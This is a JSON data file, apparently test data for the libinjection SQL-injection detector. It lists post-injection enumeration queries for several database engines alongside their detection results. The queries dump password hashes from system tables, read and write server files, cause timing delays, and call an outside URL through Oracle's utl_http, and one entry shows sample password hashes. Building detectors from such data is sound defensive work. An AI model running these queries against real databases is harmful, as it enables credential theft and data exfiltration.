@@ -1,0 +1,1022 @@
+{
+    "0": {
+        "libinj": {
+            "tokens": "En", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT user", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "1": {
+        "libinj": {
+            "tokens": "Ek", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT current_user", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "2": {
+        "libinj": {
+            "tokens": "Ef", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT session_user", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "3": {
+        "libinj": {
+            "tokens": "En()", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT getpgusername()", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "4": {
+        "libinj": {
+            "tokens": "Enkn", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT usename, passwd FROM pg_shadow", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "5": {
+        "libinj": {
+            "tokens": "Enkn", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "6": {
+        "libinj": {
+            "tokens": "Ef(1)", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT pg_sleep(10)", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "7": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT usename FROM pg_user WHERE usesuper IS TRUE", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "8": {
+        "libinj": {
+            "tokens": "Ef()", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT version()", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "9": {
+        "libinj": {
+            "tokens": "Ef()", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT current_database()", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "10": {
+        "libinj": {
+            "tokens": "EnknB", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT datname FROM pg_database ORDER BY datname LIMIT 1 OFFSET {@row@}", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "11": {
+        "libinj": {
+            "tokens": "EnknB", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT usename FROM pg_user order by usename limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "12": {
+        "libinj": {
+            "tokens": "snsns", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 39, 
+            "fprint": false
+        }, 
+        "query": "SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind='r' AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "13": {
+        "libinj": {
+            "tokens": "snsns", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 39, 
+            "fprint": false
+        }, 
+        "query": "SELECT attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "14": {
+        "libinj": {
+            "tokens": "snsns", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 39, 
+            "fprint": false
+        }, 
+        "query": "SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') AND attname LIKE '{@column_name@}' limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "15": {
+        "libinj": {
+            "tokens": "Ef(?v", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT CAST({@COLUMN_NAME@} as text) FROM {@table_name@} limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "postgresql"
+    }, 
+    "16": {
+        "libinj": {
+            "tokens": "Ef()", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT user()", 
+        "resp": "root@localhost", 
+        "db": "mysql"
+    }, 
+    "17": {
+        "libinj": {
+            "tokens": "Ev", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT @@version", 
+        "resp": "5.1.49-3", 
+        "db": "mysql"
+    }, 
+    "18": {
+        "libinj": {
+            "tokens": "Ef()", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT database()", 
+        "resp": "wordpress", 
+        "db": "mysql"
+    }, 
+    "19": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT schema_name FROM information_schema.schemata limit 1 offset {@row@}", 
+        "resp": "information_schema blog forum mysql phpmyadmin", 
+        "db": "mysql"
+    }, 
+    "20": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT user FROM mysql.user limit 1 offset {@row@}", 
+        "resp": "debian-sys-maint root testuser", 
+        "db": "mysql"
+    }, 
+    "21": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' and table_schema like '{@DATABASE@}' limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "22": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "23": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT column_name FROM information_schema.columns WHERE table_schema like '{@DATABASE@}' and table_name like '{@TABLE_NAME@}' limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "24": {
+        "libinj": {
+            "tokens": "Ef(n)", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT CONCAT(user,':',password) FROM mysql.user limit 1 offset {@row@}", 
+        "resp": "root:*0D3A44995CE7599C818F8E2B2A3BDAD77053EA69 debian-sys-maint:*45D7762381847D4F1A626190D70C0B33D8F796774 testuser:*00E247AC5F9AF26AE0194B41E1E7695D31A31122", 
+        "db": "mysql"
+    }, 
+    "25": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = \u2018SUPER\u2019", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "26": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT host, user FROM mysql.user WHERE Super_priv = \u2018Y\u2019", 
+        "resp": "127.0.0.1 root\n        \tlocalhost\n        \tdebian-sys-maint", 
+        "db": "mysql"
+    }, 
+    "27": {
+        "libinj": {
+            "tokens": "Ef(n)", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT concat(File_priv,':',Create_priv,':',Select_priv) FROM mysql.user where user like '{@user_name@}' limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "28": {
+        "libinj": {
+            "tokens": "f(s)", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "LOAD_FILE('{@file_name@}')", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "29": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT table_name FROM information_schema.columns WHERE column_name like '{@COLUMN_NAME@}' and table_schema like '{@DATABASE@}' limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "30": {
+        "libinj": {
+            "tokens": "E?vvk", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT {@COLUMN_NAME@} FROM {@table_name@} limit 1 offset {@row@}", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "31": {
+        "libinj": {
+            "tokens": "Ef(1,", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT BENCHMARK(1000000,MD5(\u2018A\u2019))", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "32": {
+        "libinj": {
+            "tokens": "Ef(1)", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT SLEEP(5)", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "33": {
+        "libinj": {
+            "tokens": "Eoknk", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT * FROM mytable INTO dumpfile \u2018/tmp/somefile\u2019", 
+        "resp": null, 
+        "db": "mysql"
+    }, 
+    "34": {
+        "libinj": {
+            "tokens": "Enkkv", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "select user from dual@{@DBLINK@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "35": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select owner from (select owner, rownum as r from (SELECT distinct owner FROM all_tables@{@DBLINK@})) WHERE r={@ROW@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "36": {
+        "libinj": {
+            "tokens": "snoos", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 39, 
+            "fprint": false
+        }, 
+        "query": "SELECT banner FROM v$version@{@DBLINK@} WHERE banner LIKE 'Oracle%%'", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "37": {
+        "libinj": {
+            "tokens": "snsns", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 39, 
+            "fprint": false
+        }, 
+        "query": "SELECT sys_context('USERENV', 'ISDBA') FROM dual@{@DBLINK@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "38": {
+        "libinj": {
+            "tokens": "Enkkv", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT SYS.DATABASE_NAME FROM DUAL@{@DBLINK@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "39": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT column_name FROM (SELECT column_name, rownum as r FROM all_tab_columns@{@DBLINK@} WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "40": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT owner FROM (SELECT owner, rownum as r FROM all_tab_columns@{@DBLINK@} WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "41": {
+        "libinj": {
+            "tokens": "s?vvs", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 39, 
+            "fprint": false
+        }, 
+        "query": "select utl_http.request('{@URL@}') from dual@{@DBLINK@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "42": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select table_name from (SELECT table_name, rownum as r FROM all_tables@{@DBLINK@}) where r={@ROW@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "43": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select table_name from (select table_name, rownum as r from (select distinct table_name from all_tab_columns@{@DBLINK@} where owner = '{@USER_NAME@}')) where r BETWEEN {@ROW@} and {@ROW@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "44": {
+        "libinj": {
+            "tokens": "s:s", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 39, 
+            "fprint": false
+        }, 
+        "query": "select USERNAME || ':' || DB_LINK from (select DB_LINK, rownum as r from ALL_DB_LINKS@{@DBLINK@}) where r BETWEEN {@ROW@} and {@ROW@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "45": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select table_name from (SELECT table_name, rownum as r FROM user_tables@{@DBLINK@}) where r BETWEEN {@ROW@} and {@ROW@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "46": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT table_name FROM (SELECT table_name,r FROM ( SELECT ROWNUM as r, table_name FROM user_tab_columns@{@DBLINK@} where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "47": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT table_name FROM (SELECT table_name,owner,r FROM ( SELECT ROWNUM as r, table_name,owner FROM all_tab_columns@{@DBLINK@} where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "48": {
+        "libinj": {
+            "tokens": "E?vvk", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "select {@COLUMN_NAME@} from (SELECT {@COLUMN_NAME@}, rownum as r FROM {@table_name@}@{@DBLINK@}) where r={@ROW@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "49": {
+        "libinj": {
+            "tokens": "Enkkv", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT UTL_INADDR.get_host_name FROM dual@{@DBLINK@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "50": {
+        "libinj": {
+            "tokens": "Efkkv", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT UTL_INADDR.get_host_address FROM dual@{@DBLINK@}", 
+        "resp": null, 
+        "db": "oracle_dblinks"
+    }, 
+    "51": {
+        "libinj": {
+            "tokens": "Enkk", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT user FROM dual", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "52": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT owner FROM (select owner, rownum as r from (SELECT distinct owner FROM all_tables)) WHERE r={@ROW@}", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "53": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT banner FROM v$version WHERE banner LIKE 'Oracle%%'", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "54": {
+        "libinj": {
+            "tokens": "Enknk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT banner FROM v$version WHERE banner LIKE 'TNS%%'", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "55": {
+        "libinj": {
+            "tokens": "Efkn", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT version FROM v$instance", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "56": {
+        "libinj": {
+            "tokens": "snsns", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 39, 
+            "fprint": false
+        }, 
+        "query": "SELECT sys_context('USERENV', 'ISDBA') FROM dual", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "57": {
+        "libinj": {
+            "tokens": "Enkn", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT name, password, astatus FROM sys.user$", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "58": {
+        "libinj": {
+            "tokens": "Enkn", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT name,spare4 FROM sys.user$", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "59": {
+        "libinj": {
+            "tokens": "Enkk", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT SYS.DATABASE_NAME FROM DUAL", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "60": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT column_name FROM (SELECT column_name, rownum as r FROM all_tab_columns WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "61": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT owner FROM (SELECT owner, rownum as r FROM all_tab_columns WHERE table_name = '{@TABLE_NAME@}' ) WHERE r={@ROW@}", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "62": {
+        "libinj": {
+            "tokens": "s?vvs", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 39, 
+            "fprint": false
+        }, 
+        "query": "select utl_http.request('{@URL@}') from dual", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "63": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select table_name from (SELECT table_name, rownum as r FROM all_tables) where r={@ROW@}", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "64": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select table_name from (select table_name, rownum as r from (select distinct table_name from all_tab_columns where owner = '{@USER_NAME@}')) where r BETWEEN {@ROW@} and {@ROW@}", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "65": {
+        "libinj": {
+            "tokens": "s:s", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 39, 
+            "fprint": false
+        }, 
+        "query": "select USERNAME || ':' || DB_LINK from (select DB_LINK, rownum as r from ALL_DB_LINKS) where r BETWEEN {@ROW@} and {@ROW@}", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "66": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select table_name from (SELECT table_name, rownum as r FROM user_tables) where r BETWEEN {@ROW@} and {@ROW@}", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "67": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT table_name FROM (SELECT table_name,r FROM ( SELECT ROWNUM as r, table_name FROM user_tab_columns where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "68": {
+        "libinj": {
+            "tokens": "Enk(E", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT table_name FROM (SELECT table_name,owner,r FROM ( SELECT ROWNUM as r, table_name,owner FROM all_tab_columns where column_name like '{@COLUMN_NAME@}') WHERE r BETWEEN {@ROW@} and {@ROW@})", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "69": {
+        "libinj": {
+            "tokens": "E?vvk", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "select {@COLUMN_NAME@} from (SELECT {@COLUMN_NAME@}, rownum as r FROM {@table_name@}) where r={@ROW@}", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "70": {
+        "libinj": {
+            "tokens": "Enkk", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT UTL_INADDR.get_host_name FROM dual", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "71": {
+        "libinj": {
+            "tokens": "Efkk", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT UTL_INADDR.get_host_address FROM dual", 
+        "resp": null, 
+        "db": "oracle"
+    }, 
+    "72": {
+        "libinj": {
+            "tokens": "En", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "select user", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "73": {
+        "libinj": {
+            "tokens": "Ek1nk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT TOP 1 name FROM master..syslogins where name not in (SELECT TOP {@ROW@} name FROM master..syslogins ORDER BY name DESC) ORDER BY name DESC", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "74": {
+        "libinj": {
+            "tokens": "Ev", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "select @@version", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "75": {
+        "libinj": {
+            "tokens": "Ef()", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT DB_NAME()", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "76": {
+        "libinj": {
+            "tokens": "Ef(?v", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "SELECT DB_NAME({@ROW@})", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "77": {
+        "libinj": {
+            "tokens": "Ek1nk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select top 1 name from syscolumns where id in (select id from sysobjects where name = '{@TABLE_NAME@}') and name not in (select top {@ROW@} name from syscolumns where id in (select id from sysobjects where name = '{@TABLE_NAME@}') order by name desc) order by name desc", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "78": {
+        "libinj": {
+            "tokens": "Ek1nk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select top 1 name from {@DATABASE@}..sysobjects WHERE xtype = 'U' and name not in (SELECT top {@ROW@} name FROM {@DATABASE@}..sysobjects WHERE xtype = 'U' order by name desc) ORDER BY name DESC", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "79": {
+        "libinj": {
+            "tokens": "Ek1nk", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select top 1 name from sysobjects WHERE xtype = 'U' and name not in (SELECT top {@ROW@} name FROM sysobjects WHERE xtype = 'U' order by name desc) ORDER BY name DESC", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "80": {
+        "libinj": {
+            "tokens": "Ek1kn", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "SELECT top 1 sysobjects.name as tablename FROM sysobjects JOIN syscolumns ON sysobjects.id=syscolumns.id WHERE sysobjects.xtype='U' AND syscolumns.name LIKE '{@column_name@}' and sysobjects.name not in (SELECT top {@row@} sysobjects.name as tablename FROM sysobjects JOIN syscolumns ON sysobjects.id=syscolumns.id WHERE sysobjects.xtype='U' AND syscolumns.name LIKE '{@column_name@}' order by sysobjects.name desc) order by sysobjects.name desc", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "81": {
+        "libinj": {
+            "tokens": "Ek1f(", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "select top 1 cast({@COLUMN_NAME@} as varchar) from {@table_name@} where {@column_name@} not in (SELECT TOP {@row@} {@COLUMN_NAME@} FROM {@TABLE_NAME@} order by {@COLUMN_NAME@} desc) ORDER BY {@COLUMN_NAME@} DESC", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "82": {
+        "libinj": {
+            "tokens": "f(f(s", 
+            "sqli": true, 
+            "reason": 0, 
+            "delim": 0, 
+            "fprint": true
+        }, 
+        "query": "(cast(is_srvrolemember('sysadmin') as varchar))", 
+        "resp": null, 
+        "db": "mssql"
+    }, 
+    "83": {
+        "libinj": {
+            "tokens": "Enkn", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "select user from sysibm.sysdummy1", 
+        "resp": null, 
+        "db": "db2"
+    }, 
+    "84": {
+        "libinj": {
+            "tokens": "Enkn", 
+            "sqli": false, 
+            "reason": 1571, 
+            "delim": 0, 
+            "fprint": false
+        }, 
+        "query": "select versionnumber, version_timestamp from sysibm.sysversions", 
+        "resp": null, 
+        "db": "db2"
+    }
+}
